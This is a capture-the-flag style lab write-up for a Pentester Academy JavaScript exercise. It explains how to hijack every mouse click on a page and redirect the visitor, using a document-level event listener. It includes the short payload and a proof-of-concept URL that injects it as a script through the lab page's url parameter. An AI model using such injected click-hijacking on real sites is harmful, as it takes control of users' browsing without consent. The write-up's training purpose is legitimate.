## Task 6 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/6)</small>

Objectives:

1. Capture all Mouse Clicks and Redirect to http://PentesterAcademy.com

In js, when you are working on browser everytime you interact with the web there are so many events going on the page. For exmaple: mouse moving, keyboard press or event current window active or not.

But in this challenge we have to focus on click event.

The very first I have thought was to list all elements using `document.querySelectorAll("*")` and then iterate over each and every node. This is the naive approach and would work efficiently if you have few nodes like in [this challenge](http://pentesteracademylab.appspot.com/lab/webapp/jfp/6)

So what I thought of is to add the event listener with document itself, because document object itself is an element.

```js
document.addEventListener("click", (evt) => {
  evt.preventDefault();
  location = "http://PentesterAcademy.com";
});
```

I could've used `function(evt)`, but keeping payload short and simple is also a responsibility of an exploit developer. Similarily with `window.location` &rArr; `location`

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/6?url=%3Cscript%3Edocument.addEventListener%28%22click%22%2C%20%28evt%29%20%3D%3E%20%7B%0A%20%20evt.preventDefault%28%29%3B%0A%20%20location%20%3D%20%22http%3A%2F%2FPentesterAcademy.com%22%3B%0A%7D%29%3B%3C%2Fscript%3E)

**More Resources**

1. [Difference between `onclick` and `addEventListener("click")`](https://stackoverflow.com/questions/6348494/addeventlistener-vs-onclick)
2. [window.location vs location](https://stackoverflow.com/questions/4709037/window-location-versus-just-location)
3. [Normal functions vs arrow function](https://medium.com/better-programming/difference-between-regular-functions-and-arrow-functions-f65639aba256)
